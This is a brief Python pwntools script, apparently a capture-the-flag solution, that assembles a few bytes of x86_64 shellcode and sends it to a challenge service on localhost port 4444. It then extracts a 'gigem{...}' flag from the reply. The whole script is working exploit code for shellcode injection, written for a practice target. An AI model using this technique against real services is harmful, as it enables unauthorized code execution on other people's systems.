from pwn import *
import re
context.arch = 'x86_64'

initial = asm(r'push %rdx; xchg %ebx,%edx; inc %edx; xchg %eax,%edx; pop %rsi; mov %edi,%eax; syscall')

print("initial payload is", len(initial), "bytes")

p = remote('localhost', 4444)

p.sendline(initial)

print(re.search("(gigem{.*})",p.recvall()[:40].decode()).group(1))
